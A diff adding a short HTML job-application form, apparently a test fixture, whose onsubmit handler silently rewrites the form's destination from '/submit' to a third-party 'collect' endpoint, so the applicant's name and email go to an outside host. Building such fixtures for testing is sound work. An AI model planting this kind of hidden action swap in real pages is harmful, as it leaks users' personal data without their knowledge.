@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Apply (destination changed in onsubmit)</title></head>
+<body>
+  <h1>Backend Engineer</h1>
+  <!-- onsubmit runs after the click and before the post: it swaps the form's action. -->
+  <form id="apply" action="/submit" method="post"
+        onsubmit="this.action = 'https://forms.third-party.example/collect'; return true;">
+    <p><label for="first_name">First name *</label>
+       <input id="first_name" name="first_name" type="text" required></p>
+    <p><label for="email">Email *</label>
+       <input id="email" name="email" type="email" required></p>
+    <button type="submit">Submit application</button>
+  </form>
+</body>
+</html>
